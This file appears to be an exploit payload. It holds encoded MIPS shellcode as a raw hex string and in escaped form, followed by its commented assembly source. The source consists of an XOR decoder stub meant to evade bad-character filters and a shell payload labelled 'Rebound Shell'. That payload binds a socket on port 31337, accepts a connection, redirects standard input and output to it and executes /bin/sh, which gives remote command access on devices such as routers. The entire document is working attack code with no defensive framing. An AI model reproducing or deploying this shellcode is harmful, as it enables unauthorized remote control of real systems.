#shellcode1
shellcode: \x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99\x27\xb2\x05\x4b\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1\x02\x2a\x18\x26\xae\x43\xff\xc1\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d\x7a\x69\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01\x01\x0c\x24\x0f\x73\x50\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c
#shellcode: \\x22\\x51\\x44\\x44\\x3c\\x11\\x99\\x99\\x36\\x31\\x99\\x99\\x27\\xb2\\x05\\x4b\\x22\\x52\\xfc\\xa0\\x8e\\x4a\\xfe\\xf9\\x02\\x2a\\x18\\x26\\xae\\x43\\xfe\\xf9\\x8e\\x4a\\xff\\x41\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\x41\\x8e\\x4a\\xff\\x5d\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\x5d\\x8e\\x4a\\xff\\x71\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\x71\\x8e\\x4a\\xff\\x8d\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\x8d\\x8e\\x4a\\xff\\x99\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\x99\\x8e\\x4a\\xff\\xa5\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\xa5\\x8e\\x4a\\xff\\xad\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\xad\\x8e\\x4a\\xff\\xb9\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\xb9\\x8e\\x4a\\xff\\xc1\\x02\\x2a\\x18\\x26\\xae\\x43\\xff\\xc1\\x24\\x12\\xff\\xff\\x24\\x02\\x10\\x46\\x24\\x0f\\x03\\x08\\x21\\xef\\xfc\\xfc\\xaf\\xaf\\xfb\\xfe\\xaf\\xaf\\xfb\\xfa\\x27\\xa4\\xfb\\xfa\\x01\\x01\\x01\\x0c\\x21\\x8c\\x11\\x5c\\x27\\xbd\\xff\\xe0\\x24\\x0e\\xff\\xfd\\x98\\x59\\xb9\\xbe\\x01\\xc0\\x28\\x27\\x28\\x06\\xff\\xff\\x24\\x02\\x10\\x57\\x01\\x01\\x01\\x0c\\x23\\x39\\x44\\x44\\x30\\x50\\xff\\xff\\x24\\x0e\\xff\\xef\\x01\\xc0\\x70\\x27\\x24\\x0d\\x7a\\x69\\x24\\x0f\\xfd\\xff\\x01\\xe0\\x78\\x27\\x01\\xcf\\x78\\x04\\x01\\xaf\\x68\\x25\\xaf\\xad\\xff\\xe0\\xaf\\xa0\\xff\\xe4\\xaf\\xa0\\xff\\xe8\\xaf\\xa0\\xff\\xec\\x9b\\x89\\xb9\\xbc\\x24\\x0e\\xff\\xef\\x01\\xc0\\x30\\x27\\x23\\xa5\\xff\\xe0\\x24\\x02\\x10\\x49\\x01\\x01\\x01\\x0c\\x24\\x0f\\x73\\x50\\x9b\\x89\\xb9\\xbc\\x24\\x05\\x01\\x01\\x24\\x02\\x10\\x4e\\x01\\x01\\x01\\x0c\\x24\\x0f\\x73\\x50\\x9b\\x89\\xb9\\xbc\\x28\\x05\\xff\\xff\\x28\\x06\\xff\\xff\\x24\\x02\\x10\\x48\\x01\\x01\\x01\\x0c\\x24\\x0f\\x73\\x50\\x30\\x50\\xff\\xff\\x9b\\x89\\xb9\\xbc\\x24\\x0f\\xff\\xfd\\x01\\xe0\\x28\\x27\\xbd\\x9b\\x96\\x46\\x01\\x01\\x01\\x0c\\x24\\x0f\\x73\\x50\\x9b\\x89\\xb9\\xbc\\x28\\x05\\x01\\x01\\xbd\\x9b\\x96\\x46\\x01\\x01\\x01\\x0c\\x24\\x0f\\x73\\x50\\x9b\\x89\\xb9\\xbc\\x28\\x05\\xff\\xff\\xbd\\x9b\\x96\\x46\\x01\\x01\\x01\\x0c\\x3c\\x0f\\x2f\\x2f\\x35\\xef\\x62\\x69\\xaf\\xaf\\xff\\xec\\x3c\\x0e\\x6e\\x2f\\x35\\xce\\x73\\x68\\xaf\\xae\\xff\\xf0\\xaf\\xa0\\xff\\xf4\\x27\\xa4\\xff\\xec\\xaf\\xa4\\xff\\xf8\\xaf\\xa0\\xff\\xfc\\x27\\xa5\\xff\\xf8\\x24\\x02\\x0f\\xab\\x01\\x01\\x01\\x0c\\x24\\x02\\x10\\x46\\x24\\x0f\\x03\\x68\\x21\\xef\\xfc\\xfc\\xaf\\xaf\\xfb\\xfe\\xaf\\xaf\\xfb\\xfa\\x27\\xa4\\xfb\\xfe\\x01\\x01\\x01\\x0c\\x21\\x8c\\x11\\x5c

# decode Shellcode
#"""
#.set noreorder
##nop
#addi    $s1, $s2, 0x4444    #nop
#li      $s1, 0x99999999         #prepare key
#addiu   $s2, $sp, 0x59F         #stack base
#addi    $s2, -0x360                     
#lw      $t2, -0x107($s2)        #First char Encoding
#xor     $v1, $s1, $t2
#sw      $v1, -0x107($s2)        
#lw      $t2, -0xBF($s2)         #second char Encoding
#xor     $v1, $s1, $t2
#sw      $v1, -0xBF($s2)
#lw      $t2, -0xA3($s2)
#xor     $v1, $s1, $t2
#sw      $v1, -0xA3($s2)
#lw      $t2, -0x8F($s2)
#xor     $v1, $s1, $t2
#sw      $v1, -0x8F($s2)
#lw      $t2, -0x73($s2)
#xor     $v1, $s1, $t2
#sw      $v1, -0x73($s2)
#lw      $t2, -0x67($s2)
#xor     $v1, $s1, $t2
#sw      $v1, -0x67($s2)
#lw      $t2, -0x5B($s2)
#xor     $v1, $s1, $t2
#sw      $v1, -0x5B($s2)
#lw      $t2, -0x53($s2)
#xor     $v1, $s1, $t2
#sw      $v1, -0x53($s2)
#lw      $t2, -0x47($s2)
#xor     $v1, $s1, $t2
#sw      $v1, -0x47($s2)
#lw      $t2, -0x3F($s2)
#xor     $v1, $s1, $t2
#sw      $v1, -0x3F($s2)
#li      $s2, 0xFFFFFFFF
#li      $v0, 4166                       #sleep
#li      $t7, 0x308
#addi    $t7, -0x304
#sw      $t7, -0x402($sp)
#sw      $t7, -0x406($sp)
#addiu   $a0, $sp, -0x406        
#syscall 0x40404                         #sleep(4)
#addi    $t4, 0x115C                     #nop
#"""
#
##Rebound Shell ShellCode
#"""
#.set noreorder
####### sys_socket ###### 
#addiu  $sp, $sp, -0x20          #robustness
#li     $t6, -0x3
#nor    $a0, $t6, $zero
#nor    $a1, $t6, $zero
#slti   $a2, $0, -1
#li     $v0, 4183
#syscall 0x40404                 
###### sys_bind ####
#add    $t9, $t9, 0x4444         #nop
#andi   $s0, $v0, 0xffff
#li     $t6, -17                  
#nor    $t6, $t6, $zero
#li     $t5, 0x7a69                      #port 31337        
#li     $t7,  -513
#nor    $t7, $t7, $zero
#sllv   $t7, $t7, $t6
#or     $t5, $t5, $t7       
#sw     $t5, -32($sp)       
#sw     $zero,-28($sp)
#sw     $zero,-24($sp)
#sw     $zero,-20($sp)
#or     $a0, $s0, $s0
#li     $t6, -17                 
#nor    $a2, $t6, $zero
#addi   $a1, $sp, -32
#li     $v0, 4169
#syscall 0x40404                 
###### listen #####
#li      $t7,0x7350
#or      $a0,$s0,$s0
#li      $a1,257
#li      $v0,4174
#syscall 0x40404                 
###### accept #####
#li      $t7,0x7350
#or      $a0,$s0,$s0
#slti    $a1,$zero,-1
#slti    $a2,$zero,-1
#li      $v0,4168
#syscall  0x40404                
###### dup fd's ####
#li      $t7,0x7350
#andi    $s0,$v0,0xffff
#or      $a0,$s0,$s0
#li      $t7,-3
#nor     $a1,$t7,$zero
#li      $v0,4063
#syscall 0x40404
#li      $t7,0x7350
#or      $a0,$s0,$s0
#slti    $a1,$zero,0x0101
#li      $v0,4063
#syscall 0x40404
#li      $t7,0x7350
#or      $a0,$s0,$s0
#slti    $a1,$zero,-1
#li      $v0,4063
#syscall 0x40404                 
#######execve######
#lui   $t7,0x2f2f
#ori   $t7,$t7,0x6269
#sw    $t7,-20($sp)
#lui   $t6,0x6e2f
#ori   $t6,$t6,0x7368
#sw    $t6,-16($sp)
#sw    $zero,-12($sp)
#addiu $a0,$sp,-20
#sw    $a0,-8($sp)
#sw    $zero,-4($sp)
#addiu $a1,$sp,-8
#li    $v0,4011
#syscall 0x40404                 
##### sleep #####
#li $v0, 4166
#li $t7, 0x0368
#addi $t7, $t7, -0x0304
#sw $t7, -0x0402($sp)
#sw $t7, -0x0406($sp)
#la $a0, -0x0406($sp)
#syscall 0x40404
#addi $t4, $t4, 4444
#"""
#
#
